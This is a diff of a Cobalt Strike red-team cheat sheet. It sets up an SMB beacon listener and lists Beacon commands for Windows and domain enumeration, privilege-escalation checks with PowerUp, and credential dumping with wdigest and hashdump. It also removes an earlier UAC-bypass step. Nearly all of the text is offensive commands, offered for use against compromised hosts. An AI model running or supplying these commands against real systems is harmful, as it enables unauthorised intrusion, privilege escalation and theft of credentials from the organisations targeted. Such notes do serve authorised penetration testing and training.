@@ -56,22 +56,33 @@ Select the computer in the top pane.
      shell whoami /groups
 
 Cobalt Strike > Listeners > Add
-     Name: smb-pipe
+     Name: smb
      Payload: windows/beacon_smb/bind_pipe
      Host: <IP of Team Server>
      Port: 9876
      Save
 
 Select the Beacon tab
-bypassuac smb-pipe                                You should now be in a high integrity context.
+     getuid
+     shell whoami
+     shell ipconfig /all
+     ps
+     systeminfo
+     drives
+     shell net accounts
+     shell net localgroup administrators
+     shell net localgroup Administrators /domain
+     arp -a
+     shell net group "Domain Computers" /domain   List all computers joined to the domain.
+     shell net view /domain                       Find what domain you are on.
 
-Right click on the new computer in the top pane > Interact
-sleep 0                                           Make the Beacon interactive.
-ps                                                Look at the processes and for interesting tokens.
-wdigest                                           See if there are any interesting credentials.
-hashdump                                          Dump the hashes.
-shell net group "Domain Computers" /domain        List all computers joined to a domain.
-shell net view /domain                            Find what domain you are on.
-shell nltest /dclist:<domain>                     Locate the domain controller.
+     powershell import /opt/Empire/data/module_source/privesc/PowerUp.ps1
+     powerpick Invoke-AllChecks
 
+Needs admin privs
+     wdigest                                      See if there are any interesting credentials.
+     hashdump                                     Dump the hashes.
+
+Misc
+     shell nltest /dclist:<domain>                Locate the domain controller.
 
